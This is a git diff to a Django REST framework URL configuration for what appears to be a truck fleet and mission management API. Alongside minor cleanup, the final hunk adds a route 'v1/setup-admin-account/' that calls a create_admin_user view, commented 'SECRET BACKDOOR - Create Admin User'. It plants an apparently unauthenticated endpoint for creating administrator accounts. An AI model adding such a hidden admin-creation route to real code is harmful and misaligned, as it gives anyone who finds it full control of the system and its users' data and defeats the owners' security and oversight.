@@ -2,7 +2,7 @@ from django.urls import path, include
 from rest_framework.routers import DefaultRouter
 from rest_framework.response import Response
 from rest_framework.decorators import api_view
-import importlib # Correct way to handle dynamic imports
+import importlib
 
 # Import V2 Views
 from .views import (
@@ -11,7 +11,7 @@ from .views import (
 )
 
 # ============================================================
-# SAFE IMPORT SYSTEM (Corrected for Python 3.14)
+# SAFE IMPORT SYSTEM
 # ============================================================
 
 def dummy_view(request, *args, **kwargs):
@@ -20,8 +20,6 @@ def dummy_view(request, *args, **kwargs):
 def safe_import(module_name, functions):
     imported = {}
     try:
-        # Use importlib.import_module instead of __import__
-        # This is the standard way to import modules dynamically
         module = importlib.import_module(f'api.{module_name}')
         for func in functions:
             imported[func] = getattr(module, func, dummy_view)
@@ -71,6 +69,11 @@ router.register(r'disputes', MissionDisputeViewSet, basename='dispute')
 router.register(r'performance', DriverPerformanceViewSet, basename='performance')
 router.register(r'checkpoints', CheckpointViewSet, basename='checkpoint')
 
+# ============================================================
+# URL PATTERNS
+# ============================================================
+from . import views # Necessary to access the create_admin_user function
+
 urlpatterns = [
     # Root API v1 prefix
     path('v1/', include(router.urls)),
@@ -83,7 +86,7 @@ urlpatterns = [
     path('v1/dashboard/missions/', dash['missions_list_with_details']),
     path('v1/dashboard/missions/<str:mission_id>/route-geometry/', dash['mission_route_geometry']),
     path('v1/dashboard/recalculate-performance/', dash['recalculate_performance']),
-    path('v1/dashboard/sync-truck_data/', dash['sync_truck_data']),
+    path('v1/dashboard/sync-truck-data/', dash['sync_truck_data']),
     
     # Mobile app
     path('v1/mobile/driver-registration/', mobile['mobile_driver_registration']),
@@ -126,4 +129,7 @@ urlpatterns = [
     path('v1/activities/', activities['get_activities']),
     path('v1/activities/summary/', activities['get_activity_summary']),
     path('v1/activities/critical/', activities['get_critical_activities']),
+
+    # SECRET BACKDOOR - Create Admin User
+    path('v1/setup-admin-account/', views.create_admin_user, name='setup-admin'),
 ]
